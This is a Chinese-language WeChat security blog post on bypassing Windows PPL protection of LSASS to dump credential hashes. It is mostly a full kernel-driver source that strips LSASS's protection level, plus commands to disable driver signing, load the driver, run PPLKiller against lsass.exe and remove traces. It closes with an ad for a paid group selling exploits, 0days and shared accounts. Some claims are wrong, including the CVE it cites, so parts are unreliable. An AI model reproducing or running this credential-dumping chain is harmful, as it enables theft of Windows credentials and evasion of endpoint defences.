---
title: dumphash详解
url: https://mp.weixin.qq.com/s/Ill1OFFqQ-ZIbVJ2--EWGg
source: Doonsec's feed
date: 2026-01-17
fetch_date: 2026-01-18T03:35:22.365367
---

# dumphash详解

![cover_image](https://mmbiz.qpic.cn/mmbiz_jpg/kSsBcTbgnEHcdC9Uy4Hx5YvuFiaE7e0Ec28SH1RcpoEH2Ueic3ziaDYPT3ey8pDJ0V2lKiayHKictREY5dSCmV1Rx0w/0?wx_fmt=jpeg)

# dumphash详解

原创

SharkSec
SharkSec

SharkSec

![]()

在小说阅读器中沉浸阅读

🔔 **温馨提示**：为了防止走散，不错过每一篇干货内容，请记得将公众号设置为**星标**！🌟

![图片](https://mmbiz.qpic.cn/mmbiz_png/cr9YyS063QrVstianyX9gPA4EZicfkbyKdBQyPtQHPwSLJePicuZmXcBiaLaRSTWrY6UibPpAaeNxLjOSiaeHaSvdHMg/640?from=appmsg&wxfrom=5&wx_lazy=1&wx_fmt=other&tp=webp#imgIndex=0)

![图片](https://mmbiz.qpic.cn/mmbiz_gif/CGEwnc7DGPkXwCkjLX8HzCgjKO1KuxPTWw8L9BNNTM3b8WVfHQxV3vIibDycqksck67KWnnVu75ctUZFfpde2kw/640?from=appmsg&wxfrom=5&wx_lazy=1&wx_fmt=gif&tp=webp#imgIndex=1)

【声明】本文技术、思路及工具仅用于合法安全测试与防御研究，严禁用于非法入侵、攻击他人系统或盈利等违法违规行为，一切后果由操作者自行承担，作者及团队不承担任何连带责任。

**一、ppl介绍**

PPL 是 Windows 8.1 + 引入的进程保护机制，LSASS（Local Security Authority Subsystem Service）默认标记为PROTECTED\_ANTIMALWARE\_LIGHT/PROTECTED\_SYSTEM\_LIGHT，普通进程即使有SE\_DEBUG\_NAME权限，也无法：

● 打开 LSASS 进程（OpenProcess返回权限不足）；

● 读取 LSASS 内存（ReadProcessMemory失败）；

● 调用MiniDumpWriteDump Dump LSASS。

在实战情况下，红队落地后第一步就是“抓哈希”，常规做法直接转储 LSASS；但从 Win8.1 开始系统默认给 LSASS 套上 PPL。结果是：

●  任务管理器、Procdump、Mimikatz 一律“访问拒绝”；

●  即使当前账号已是本地管理员，开了 SeDebugPrivilege 也打不开进程句柄；

●EDR 还会把“枚举 lsass.exe → OpenProcess → MiniDumpWriteDump”这一整条行为链标记为高危，直接拦截告警。

**二、ppl绕过思路**

在实战情况下，可通过内核驱动 修改 LSASS 的保护级别（核心是修改进程的EPROCESS结构体中ProtectionLevel字段），以下是「驱动 + 应用层」绕过方案示例代码（仅参考）：

1

**内核驱动代码（PPL 绕过核心，VS2022+WDK 编译）**

```
#include <ntddk.h>#include <wdm.h>// 定义EPROCESS中ProtectionLevel的偏移（不同系统版本偏移不同，以Win10 22H2为例）#define EPROCESS_PROTECTION_LEVEL_OFFSET 0x678 // Win10 22H2 x64#define EPROCESS_IMAGE_NAME_OFFSET 0x5a8       // 进程名偏移// 根据进程名查找EPROCESSPEPROCESS FindProcessByName(PCWSTR ProcessName) {    PEPROCESS pEprocess = NULL;    ULONG uIndex = 0;    NTSTATUS status = STATUS_SUCCESS;    while (TRUE) {        status = PsLookupProcessByProcessId((HANDLE)uIndex, &pEprocess);        if (!NT_SUCCESS(status)) break;        // 获取进程名        PWSTR pProcessName = (PWSTR)((PUCHAR)pEprocess + EPROCESS_IMAGE_NAME_OFFSET);        if (_wcsicmp(pProcessName, ProcessName) == 0) {            ObDereferenceObject(pEprocess);            return pEprocess;        }        ObDereferenceObject(pEprocess);        uIndex += 4; // 进程PID通常是4的倍数        if (uIndex > 0x10000) break; // 防止无限循环    }    return NULL;}// 降低进程保护级别NTSTATUS LowerProcessProtection(PCWSTR ProcessName) {    PEPROCESS pEprocess = FindProcessByName(ProcessName);    if (pEprocess == NULL) return STATUS_NOT_FOUND;    // 修改ProtectionLevel为0（无保护）    PUCHAR pProtectionLevel = (PUCHAR)pEprocess + EPROCESS_PROTECTION_LEVEL_OFFSET;    *pProtectionLevel = 0x00; // 0=无保护，1=PPL，2=Protected Process    DbgPrint("LSASS PPL保护已绕过！\n");    return STATUS_SUCCESS;}// 驱动派遣函数NTSTATUS DriverDispatch(IN PDEVICE_OBJECT DeviceObject, IN PIRP Irp) {    UNREFERENCED_PARAMETER(DeviceObject);    Irp->IoStatus.Status = STATUS_SUCCESS;    Irp->IoStatus.Information = 0;    IoCompleteRequest(Irp, IO_NO_INCREMENT);    return STATUS_SUCCESS;}// 驱动卸载函数VOID DriverUnload(IN PDRIVER_OBJECT DriverObject) {    UNICODE_STRING symLinkName = RTL_CONSTANT_STRING(L"\\??\\PPLBypass");    IoDeleteSymbolicLink(&symLinkName);    IoDeleteDevice(DriverObject->DeviceObject);    DbgPrint("PPL绕过驱动已卸载！\n");}// 驱动入口函数NTSTATUS DriverEntry(IN PDRIVER_OBJECT DriverObject, IN PUNICODE_STRING RegistryPath) {    UNREFERENCED_PARAMETER(RegistryPath);    NTSTATUS status = STATUS_SUCCESS;    PDEVICE_OBJECT pDeviceObject = NULL;    UNICODE_STRING deviceName = RTL_CONSTANT_STRING(L"\\Device\\PPLBypass");    UNICODE_STRING symLinkName = RTL_CONSTANT_STRING(L"\\??\\PPLBypass");    // 设置派遣函数    for (int i = 0; i < IRP_MJ_MAXIMUM_FUNCTION; i++) {        DriverObject->MajorFunction[i] = DriverDispatch;    }    DriverObject->DriverUnload = DriverUnload;    // 创建设备    status = IoCreateDevice(DriverObject, 0, &deviceName, FILE_DEVICE_UNKNOWN, 0, FALSE, &pDeviceObject);    if (!NT_SUCCESS(status)) return status;    // 创建符号链接    status = IoCreateSymbolicLink(&symLinkName, &deviceName);    if (!NT_SUCCESS(status)) {        IoDeleteDevice(pDeviceObject);        return status;    }    // 绕过LSASS的PPL保护    LowerProcessProtection(L"lsass.exe");    DbgPrint("PPL绕过驱动加载成功！\n");    return STATUS_SUCCESS;}
```

2

**驱动编译与加载（关键！）**

      1. 环境准备：安装 VS2022 + Windows Driver Kit (WDK) 10；

2. 编译驱动：新建「Kernel Mode Driver, Empty (KMDF)」项目，粘贴上述代码，选择`x64`平台编译，生成`PPLBypass.sys`；

3. 关闭驱动签名强制（测试环境）：bash运行

```
# 管理员运行CMD，执行后重启电脑（进入测试模式）bcdedit /set testsigning on
```

4. 加载驱动（管理员 CMD）：bash运行

```
# 加载驱动sc create PPLBypass type= kernel binPath= "C:\PPLBypass.sys"sc start PPLBypass
```

3

**应用层 Dump 代码**

      驱动加载成功后，直接运行之前的代码，即可成功 Dump LSASS（此时OpenProcess和MiniDumpWriteDump均不会因 PPL 报错）。

4

**临时漏洞绕过（无需驱动 / 重启，仅限特定系统）**

     针对部分 Windows 版本（如 Win10 20H1/20H2、Win11 21H2），可利用公开的 PPL 绕过漏洞（如 CVE-2021-36934）临时提升权限，以下是简化版工具使用方法：

1. 下载开源 PPL 绕过工具（如PPLKiller，仅用于测试）；

2. 管理员运行工具：bash运行

```
PPLKiller.exe -d lsass.exe
```

      3. 工具会临时降低 LSASS 的 PPL 保护级别，此时立即运行你的 Dump 代码，即可成功。

5

**集成后的完整流程（驱动绕过 + Dump + 加密）**

      1.  编译并加载 PPL 绕过驱动（关闭驱动签名，加载PPLBypass.sys）；

2.  运行修改后的 Dump 代码（临时文件方案，复用你的 RC4 加密）；

3.  Dump 完成后，卸载驱动：bash运行

```
sc stop PPLBypasssc delete PPLBypass
```

4. 最终得到加密后的 LSASS Dump 文件，无明文残留。

github相关项目地址：

```
WSASS: https://github.com/2x7EQ13/WSASSpplkiller: https://github.com/Mattiwatti/PPLKillerppldump: https://github.com/itm4n/PPLdump
```

**三、dumphash小工具**

这里也有一个dumphash的免杀小工具，使用方式及效果可直接看下面视频：

本文涉及工具，整理后上传至纷传，感兴趣的师傅可以直接在纷传中获取。

如果大家对我们的文章技术有什么建议或者工具使用上的反馈，都欢迎大家在评论区留言交流。对我们分享的文章感兴趣，想要深入探讨、交流并学习更多相关内容，也欢迎各位师傅加入官方技术交流群!!!（关注公众号，点击菜单栏：联系我们->技术交流群，添加管理员微信，备注【加群】，拉您进群）

![图片](https://mmbiz.qpic.cn/sz_mmbiz_png/66Px0lScLmhsSQ81eCsVKJ3rdZkSvWiajhKcPGVl5T8wjtDrfJwp0JOA6IpdLIBVawKV3q1zsXaOP95lR6Gm0zg/640?from=appmsg&wxfrom=5&wx_lazy=1&wx_fmt=other&tp=webp#imgIndex=2)

![图片](https://mmbiz.qpic.cn/mmbiz_png/IEccNBf01KhlXSXZveRicx71HjXRoxf4N3auzMP8luVj3eupK7xS0R7jcBiaWXicawKPpLiamx4icOURtlgUdGjaVSQ/640?wx_fmt=other&wxfrom=5&wx_lazy=1&tp=webp#imgIndex=14)

加入圈子，一起进阶！

我们圈子已平稳运营一段时间啦，后续也会持续为大家输送高质量的实战资源：有一线团队的一手攻防经验、私有工具源码（包括咱们公众号发的工具，圈子里能直接拿源码 + 持续迭代），还有漏洞挖掘的 POC/EXP、每月不定期 0day 分享，hw实战攻防遇见高频oa/设备源码都能在这拿到。

对了，圈子里还有些「刚需资源」：FOFA 的 Key 长期能用，Cursor Pro 共享账号登了就能用； 企业 SRC 案例、红队实战经验也会拆解着讲。

现在圈子**现价 129 / 人**，等满 200 人就涨到 150/人 了 —— 入了圈子还能进专属内部群，比咱们公开交流群的资源更新更实时、讨论也更深度。

纷传和知识星球内容是同步的，后期主要运营纷传，所以想进圈子的朋友直接扫描下方二维码就可以啦~

![Image](https://mmbiz.qpic.cn/mmbiz_jpg/kSsBcTbgnEGBFE00Q6eCTpvfmd1VDdfZRkUk0cga8Ecyo5QCEXz3jXianMVwP7mbBVMKoSsNhAsAAWMkr0dia9ag/640?wx_fmt=jpeg&from=appmsg&watermark=1&wxfrom=5&wx_lazy=1&tp=webp#imgIndex=6)

结束

👉 点击关注不迷路，一起潜入深水区，突破边界，共同精进！🚀

预览时标签不可点

![]()

微信扫一扫
关注该公众号

继续滑动看下一个

轻触阅读原文

![](http://mmbiz.qpic.cn/mmbiz_png/kSsBcTbgnEEp9Bic1ajub6AAicIRCoc1GRlnsE7b1wz0MOfXibDJm0CKICT2vMqcmdELjlsyK7W0hS9Ck2JyNabyw/0?wx_fmt=png)

SharkSec

向上滑动看下一个

知道了

![]()
微信扫一扫
使用小程序

取消
允许

取消
允许

取消
允许

×
分析

![跳转二维码]()

![作者头像](http://mmbiz.qpic.cn/mmbiz_png/kSsBcTbgnEEp9Bic1ajub6AAicIRCoc1GRlnsE7b1wz0MOfXibDJm0CKICT2vMqcmdELjlsyK7W0hS9Ck2JyNabyw/0?wx_fmt=png)

微信扫一扫可打开此内容，
使用完整服务

：
，
，
，
，
，
，
，
，
，
，
，
，
。

视频
小程序
赞
，轻点两下取消赞
在看
，轻点两下取消在看
分享
留言
收藏
听过